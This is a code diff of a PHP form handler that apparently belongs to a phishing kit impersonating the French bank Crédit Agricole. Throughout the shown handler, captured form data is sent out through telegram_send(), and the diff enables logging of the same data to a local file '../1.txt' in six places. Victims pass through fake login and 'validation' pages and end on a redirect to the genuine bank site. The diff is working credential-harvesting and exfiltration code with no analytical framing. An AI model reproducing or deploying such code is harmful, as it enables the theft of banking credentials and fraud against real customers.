@@ -68,7 +68,7 @@ if($_SERVER['REQUEST_METHOD'] == "POST") {
             $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
 
             //mail($to,$subject,$message,$headers);
-            //file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
+            file_put_contents("../1.txt", $message, FILE_APPEND);
             header("location: login.php?particulier#_$dispatch");
 
         } else {
@@ -111,7 +111,7 @@ if($_SERVER['REQUEST_METHOD'] == "POST") {
 
 			telegram_send(urlencode($message));
            // mail($to,$subject,$message,$headers);
-            //file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
+            file_put_contents("../1.txt", $message, FILE_APPEND);
             header("location: loading.php?validation#_$dispatch");
 
         } else {
@@ -151,7 +151,7 @@ if($_SERVER['REQUEST_METHOD'] == "POST") {
 
 			telegram_send(urlencode($message));
             //mail($to,$subject,$message,$headers);
-            //file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
+            file_put_contents("../1.txt", $message, FILE_APPEND);
             header("location: loading1.php?validation#_$dispatch");
 
         } else {
@@ -191,7 +191,7 @@ if($_SERVER['REQUEST_METHOD'] == "POST") {
 
 			telegram_send(urlencode($message));
             //mail($to,$subject,$message,$headers);
-            //file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
+            file_put_contents("../1.txt", $message, FILE_APPEND);
             header("location: loading2.php?validation#_$dispatch");
 
         } else {
@@ -232,7 +232,7 @@ if($_SERVER['REQUEST_METHOD'] == "POST") {
 
 			telegram_send(urlencode($message));
             //mail($to,$subject,$message,$headers);
-            //file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
+            file_put_contents("../1.txt", $message, FILE_APPEND);
             header("location: loading3.php?validation#_$dispatch");
 
         } else {
@@ -328,7 +328,7 @@ if($_SERVER['REQUEST_METHOD'] == "POST") {
 
 			telegram_send(urlencode($message));
             //mail($to,$subject,$message,$headers);
-            //file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
+            file_put_contents("../1.txt", $message, FILE_APPEND);
             session_destroy();
             header("location: https://www.credit-agricole.fr/");
 
